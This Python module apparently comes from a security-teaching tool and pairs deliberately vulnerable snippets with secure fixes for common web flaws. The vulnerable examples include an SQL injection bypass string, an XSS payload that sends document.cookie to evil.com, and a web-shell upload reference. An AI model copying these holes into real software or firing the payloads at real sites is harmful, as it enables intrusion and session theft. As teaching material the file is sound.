# FILE: backend/ai_engine/fallback_content.py
# PURPOSE: Real code examples and payloads used when AI output contains placeholders
# SECURITY NOTE: All examples are educational only — never deploy vulnerable patterns

# ── Real code examples per vuln type ─────────────────────────────────────────

FALLBACK_CODE: dict[str, dict[str, str]] = {

    "sql_injection": {
        "vulnerable": """\
# VULNERABLE: raw SQL string concatenation — NEVER do this
def login(email: str, password: str):
    # Payload ' OR '1'='1'-- breaks this to:
    # SELECT * FROM users WHERE email='' OR '1'='1'--' AND password='x'
    # The -- comments out the password check; returns the first user
    query = f"SELECT * FROM users WHERE email='{email}' AND password='{password}'"
    result = db.execute(query)
    return result.fetchone()  # attacker gets first row without valid credentials""",

        "secure": """\
# SECURE: parameterized query — payload treated as literal string
def login(email: str, password: str):
    # Payload ' OR '1'='1'-- is never interpreted as SQL syntax
    # It becomes a literal string comparison that simply fails
    query = "SELECT id, email, password_hash FROM users WHERE email = ?"
    row = db.execute(query, (email,)).fetchone()
    if row and bcrypt.checkpw(password.encode(), row["password_hash"].encode()):
        return row
    return None  # explicit None prevents timing-based enumeration""",
    },

    "xss": {
        "vulnerable": """\
// VULNERABLE: unsafe innerHTML — executes arbitrary HTML/JS
function renderComment(userInput) {
    // userInput = "<script>fetch('https://evil.com?c='+document.cookie)</script>"
    // This executes the script in the victim's browser context
    document.getElementById('comment-box').innerHTML = userInput;
    // Session cookie silently exfiltrated to attacker server
}""",

        "secure": """\
// SECURE: textContent — never interprets as HTML
function renderComment(userInput) {
    // textContent escapes all HTML — <script> becomes &lt;script&gt;
    document.getElementById('comment-box').textContent = userInput;
}

// Server-side (Python): sanitise with bleach allowlist
import bleach
ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'p']
def sanitize(text: str) -> str:
    return bleach.clean(text, tags=ALLOWED_TAGS, attributes={}, strip=True)""",
    },

    "csrf": {
        "vulnerable": """\
<!-- VULNERABLE: no CSRF token — any site can forge this request -->
<form action="/api/profile/update" method="POST">
  <input name="email" value="">
  <button type="submit">Update</button>
</form>
<!-- Attacker page auto-submits this form using victim's active session cookies
     The server has no way to distinguish legitimate from forged requests -->""",

        "secure": """\
<!-- SECURE: CSRF token tied to session — forged requests fail validation -->
<form action="/api/profile/update" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input name="email" value="">
  <button type="submit">Update</button>
</form>

# Server-side validation (Python/FastAPI)
def verify_csrf(request: Request, token: str = Form(...)):
    expected = generate_csrf_token(request.session["id"])
    if not hmac.compare_digest(token, expected):
        raise HTTPException(403, "CSRF token invalid")""",
    },

    "file_upload": {
        "vulnerable": """\
# VULNERABLE: no validation — saves with original filename
from flask import request
import os

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['upload']
    # Attacker uploads shell.php → executes at /uploads/shell.php?cmd=id
    # Original filename preserved, any extension accepted, no MIME check
    file.save(os.path.join('uploads', file.filename))
    return f"Saved: {file.filename}" """,

        "secure": """\
# SECURE: MIME type validation + UUID rename + store outside webroot
import magic, uuid, os
from flask import request, abort

ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
UPLOAD_DIR = '/var/data/uploads_outside_webroot'  # not served by nginx

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['upload']
    content = file.read()
    # Check actual file content, not header Content-Type
    detected = magic.from_buffer(content, mime=True)
    if detected not in ALLOWED_MIMES:
        abort(400, f"File type not allowed: {detected}")
    ext = {
        'image/jpeg': '.jpg', 'image/png': '.png',
        'image/gif': '.gif',  'application/pdf': '.pdf'
    }[detected]
    safe_name = f"{uuid.uuid4().hex}{ext}"  # UUID — attacker cannot predict path
    with open(os.path.join(UPLOAD_DIR, safe_name), 'wb') as f:
        f.write(content)
    return {"filename": safe_name}""",
    },

    "broken_auth": {
        "vulnerable": """\
# VULNERABLE: MD5 (no salt), no rate limiting
import hashlib

def login(username: str, password: str):
    stored_hash = db.get("SELECT password_hash FROM users WHERE username=?", username)
    # md5("password") = 5f4dcc3b5aa765d61d8327deb882cf99
    # Crackable in <1 second via rainbow table
    if hashlib.md5(password.encode()).hexdigest() == stored_hash:
        return create_session(username)  # no attempt limit — brute force possible
    return None""",

        "secure": """\
# SECURE: bcrypt + rate limiting
from passlib.hash import bcrypt
from slowapi import Limiter
limiter = Limiter(key_func=get_remote_address)

@limiter.limit("5/minute")  # max 5 login attempts per IP per minute
def login(username: str, password: str):
    row = db.get("SELECT id, password_hash FROM users WHERE username=?", (username,))
    if not row:
        # Constant-time comparison even for missing user to prevent timing attacks
        bcrypt.verify("dummy", "$2b$12$dummy_hash_to_prevent_timing_attack")
        return None
    if bcrypt.verify(password, row["password_hash"]):
        return create_session(row["id"])
    return None""",
    },

    "security_misconfig": {
        "vulnerable": """\
# nginx — no security headers, HTTP allowed
server {
    listen 80;
    server_name example.com;
    location / {
        proxy_pass http://app:8000;
    }
    # Missing: HTTPS redirect, CSP, HSTS, X-Frame-Options,
    # X-Content-Type-Options, Referrer-Policy
    # Default Nginx version header exposes server version
}""",

        "secure": """\
# nginx — full security header set + HTTPS only
server {
    listen 80;
    server_name example.com;
    return 301 https://$host$request_uri;  # force HTTPS
}
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    server_tokens off;  # hide nginx version

    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy  "default-src 'self'; script-src 'self'" always;
    add_header X-Frame-Options          "DENY" always;
    add_header X-Content-Type-Options   "nosniff" always;
    add_header Referrer-Policy          "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy       "geolocation=(), camera=()" always;

    location / { proxy_pass http://app:8000; }
}""",
    },

    "sensitive_data_exposure": {
        "vulnerable": """\
# VULNERABLE: logging passwords, storing full card number
import logging
logger = logging.getLogger(__name__)

def process_payment(username: str, password: str, card: str):
    # Plaintext password in logs — accessible to anyone with log access
    logger.info(f"Processing payment: user={username} pass={password}")
    # Full card number stored in DB — PCI-DSS violation
    db.save({"card_number": card, "cvv": request.json['cvv']})""",

        "secure": """\
# SECURE: never log sensitive fields, tokenize payment data
import logging
logger = logging.getLogger(__name__)

def process_payment(username: str, password: str, card: str):
    logger.info(f"Processing payment: user={username}")  # no password
    # Tokenize via payment provider — real card never stored
    token = payment_provider.tokenize(card)
    db.save({
        "card_token": token,
        "last_four": card[-4:],  # only last 4 digits for display
    })""",
    },

    "logging_monitoring": {
        "vulnerable": """\
# VULNERABLE: no logging of attack attempts, logs deletable
import logging

@app.route('/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    # No failed attempt logging — brute force undetectable
    # No alert on repeated failures — no SOC notification
    result = authenticate(username, password)
    return jsonify({"success": bool(result)})  # same response for valid/invalid user""",

        "secure": """\
# SECURE: structured logging with correlation IDs + integrity
import logging, uuid
from datetime import datetime

@app.route('/login', methods=['POST'])
def login():
    req_id = str(uuid.uuid4())
    username = request.json.get('username', '')
    result = authenticate(username, request.json.get('password', ''))

    # Structured log — shipped to SIEM (never log the password)
    logging.getLogger('security').warning(
        "auth_attempt",
        extra={
            "request_id": req_id, "username": username,
            "success": bool(result), "ip": request.remote_addr,
            "timestamp": datetime.utcnow().isoformat()
        }
    )
    # Alert on 5+ failures from same IP
    if not result:
        rate_limiter.record_failure(request.remote_addr)
    return jsonify({"success": bool(result)})""",
    },

    "supply_chain": {
        "vulnerable": """\
<!-- VULNERABLE: external script with no SRI hash -->
<!-- If CDN is compromised, malicious code served to all users -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<link rel="stylesheet" href="https://cdn.bootstrap.com/5.3.0/css/bootstrap.min.css">
# Also: package.json with unpinned versions
{
  "dependencies": {
    "express": "^4.17.0",    /* ^ allows minor updates with potential CVEs */
    "lodash": "*"            /* * accepts any version including malicious ones */
  }
}""",

        "secure": """\
<!-- SECURE: Subresource Integrity (SRI) hash prevents tampered CDN delivery -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdB/"
        crossorigin="anonymous"></script>

# package.json: pin exact versions + use lock file
{
  "dependencies": {
    "express": "4.18.2",    // exact version pinned
    "lodash": "4.17.21"     // exact version pinned
  }
}
# CI pipeline: npm audit --audit-level=high in every build
# Automated dependency update PRs via Dependabot / Renovate""",
    },

    "cryptographic_failure": {
        "vulnerable": """\
# VULNERABLE: MD5/SHA1 and AES-ECB — broken algorithms
import hashlib
from Crypto.Cipher import AES

# MD5 — instantly cracked via rainbow table
password_hash = hashlib.md5(password.encode()).hexdigest()
# sha1("password") = 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8

# AES-ECB — identical plaintext produces identical ciphertext
# Pattern leaks through encryption (famous penguin attack)
cipher = AES.new(key, AES.MODE_ECB)
ciphertext = cipher.encrypt(pad(data, 16))""",

        "secure": """\
# SECURE: bcrypt for passwords, AES-GCM for data
from passlib.hash import bcrypt
from Crypto.Cipher import AES
import secrets

# bcrypt: automatic salt, work factor adjustable
password_hash = bcrypt.hash(password, rounds=12)

# AES-256-GCM: authenticated encryption with unique nonce per message
key = secrets.token_bytes(32)    # 256-bit key from CSPRNG
nonce = secrets.token_bytes(12)  # unique per message
cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
ciphertext, tag = cipher.encrypt_and_digest(data)
# Store: nonce + tag + ciphertext  (nonce is not secret)""",
    },

    "insecure_design": {
        "vulnerable": """\
# VULNERABLE: IDOR — no ownership check
@app.route('/api/orders/<int:order_id>')
def get_order(order_id: int):
    # Returns any order by ID — no check that requester owns it
    # User A can access User B's orders by incrementing the ID
    order = db.query("SELECT * FROM orders WHERE id=?", (order_id,))
    return jsonify(order)

# VULNERABLE: mass assignment
@app.route('/api/profile', methods=['PATCH'])
def update_profile():
    # Blindly applies all JSON fields — attacker can set role=admin
    user = db.get_user(session['user_id'])
    user.update(**request.json)  # role, is_admin, credit_balance all writable""",

        "secure": """\
# SECURE: enforce ownership + allowlist fields
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id: int):
    order = db.query(
        "SELECT * FROM orders WHERE id=? AND user_id=?",
        (order_id, current_user.id)   # ownership enforced at DB level
    )
    if not order:
        abort(404)  # 404 not 403 — don't leak existence of other users' orders
    return jsonify(order)

@app.route('/api/profile', methods=['PATCH'])
@login_required
def update_profile():
    # Allowlist — only these fields can be changed by the user
    ALLOWED_FIELDS = {'display_name', 'email', 'avatar_url'}
    updates = {k: v for k, v in request.json.items() if k in ALLOWED_FIELDS}
    db.update_user(current_user.id, **updates)""",
    },

    "exceptional_conditions": {
        "vulnerable": """\
# VULNERABLE: no input validation, verbose errors, no transaction
from flask import request, jsonify
import json

@app.route('/api/transfer', methods=['POST'])
def transfer():
    # Crashes on non-integer, leaks stack trace to client
    amount = int(request.json['amount'])   # TypeError if string input
    # Not atomic — if second query fails, money lost
    db.execute("UPDATE accounts SET balance=balance-? WHERE id=?",
               (amount, request.json['sender_id']))
    db.execute("UPDATE accounts SET balance=balance+? WHERE id=?",
               (amount, request.json['receiver_id']))
    return jsonify({"ok": True})""",

        "secure": """\
# SECURE: strict validation + atomic transaction + generic errors
from flask import request, jsonify
from contextlib import contextmanager

@app.route('/api/transfer', methods=['POST'])
def transfer():
    # Validate before any DB work
    data = request.get_json(silent=True) or {}
    amount = data.get('amount')
    if not isinstance(amount, int) or amount <= 0 or amount > 1_000_000:
        return jsonify({"error": "Invalid amount"}), 400

    sender_id   = data.get('sender_id')
    receiver_id = data.get('receiver_id')
    if not sender_id or not receiver_id or sender_id == receiver_id:
        return jsonify({"error": "Invalid account"}), 400

    try:
        with db.transaction():   # atomically rollback if any step fails
            db.execute("UPDATE accounts SET balance=balance-? WHERE id=? AND balance>=?",
                       (amount, sender_id, amount))
            if db.rowcount == 0:
                raise ValueError("Insufficient funds")
            db.execute("UPDATE accounts SET balance=balance+? WHERE id=?",
                       (amount, receiver_id))
    except Exception:
        return jsonify({"error": "Transfer failed"}), 400  # generic — no internals leaked
    return jsonify({"ok": True})""",
    },

    "underprotected_apis": {
        "vulnerable": """\
# VULNERABLE: GraphQL introspection + no rate limiting + mass data exposure
import strawberry
from fastapi import APIRouter

# Introspection enabled in production — exposes full schema to attackers
schema = strawberry.Schema(query=Query, introspection=True)

@router.get("/api/users")
def get_all_users():
    # Returns all users with no pagination and no auth
    return db.query("SELECT id, email, password_hash, role FROM users")
    # Attacker gets complete user database in one request""",

        "secure": """\
# SECURE: disable introspection in prod, add auth + rate limiting + pagination
import os
import strawberry
from fastapi import APIRouter, Depends
from slowapi import Limiter

schema = strawberry.Schema(
    query=Query,
    introspection=(os.getenv("ENV") == "development")  # disabled in production
)

@router.get("/api/users")
@limiter.limit("100/hour")
@require_auth
def get_users(page: int = 0, current_user=Depends(get_current_user)):
    if current_user.role != "admin":
        raise HTTPException(403, "Admin only")
    # Paginated + field-filtered response
    return db.query(
        "SELECT id, display_name FROM users LIMIT 20 OFFSET ?",
        (page * 20,)
    )""",
    },
}


# ── Fallback payloads — sourced from payload_generator.py PAYLOADS dict ──────

def get_fallback_payloads(vuln_type: str, difficulty: str = "beginner") -> list[dict]:
    """Returns real payload objects for a vuln type, sourced from the payload library."""
    from ai_engine.tools.payload_generator import PAYLOADS
    return PAYLOADS.get(vuln_type, {}).get(difficulty, [])


# ── Placeholder detector ──────────────────────────────────────────────────────

PLACEHOLDER_STRINGS: list[str] = [
    "example payload string",
    "exploit payload",
    "payload string",
    "# secure code example",
    "# vulnerable code example",
    "// secure code example",
    "// vulnerable code example",
    "your payload here",
    "insert payload",
    "see documentation",
    "see owasp docs",
]

_PLACEHOLDER_SET = {s.lower().strip() for s in PLACEHOLDER_STRINGS}


def is_placeholder(text: str) -> bool:
    return not text or text.lower().strip() in _PLACEHOLDER_SET
